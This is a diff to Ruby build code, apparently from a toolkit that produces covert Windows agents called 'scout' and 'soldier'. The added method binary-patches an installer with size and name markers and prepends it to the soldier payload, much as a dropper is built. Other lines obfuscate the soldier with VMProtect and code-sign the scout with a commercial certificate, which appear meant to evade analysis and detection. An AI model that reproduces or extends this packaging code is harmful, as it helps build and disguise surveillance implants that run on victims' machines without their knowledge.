@@ -279,6 +279,25 @@ class BuildWindows < Build
     scout_name(seed[0].next)
   end
 
+  def soldier_upgrade!
+    raise "Cannot find soldier" unless File.exist? path('output')
+    raise "Cannot find soldier installer" unless File.exist? path('soldier_upgrade')
+
+    patch_file(:file => 'soldier_upgrade') do |content|
+      begin
+        content.binary_patch 'SIZE', [File.size(path('output'))].pack('I')
+        content.binary_patch 'SOLDIEROSOLDIEROSOLDIEROSOLDIERO', soldier_name(@factory.confkey)[:name].ljust(32, "\x00")
+      rescue Exception => e
+        raise "Soldier upgrade marker not found: #{e.message}"
+      end
+    end
+
+    installer = File.open(path('soldier_upgrade'), 'rb+') {|f| f.read}
+    soldier = File.open(path('output'), 'rb+') {|f| f.read}
+
+    File.open(path('output'), 'wb+') {|f| f.write installer + soldier}
+  end
+
   private
 
   def cook
@@ -474,6 +493,10 @@ class BuildWindows < Build
     # vmprotect the scout
     CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
     FileUtils.mv path('scout_vmp'), path('scout')
+
+    # vmprotect the soldier
+    CrossPlatform.exec path('VMProtect_Con'), "#{path('soldier')} #{path('soldier_vmp')}"
+    FileUtils.mv path('soldier_vmp'), path('soldier')
 
     # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
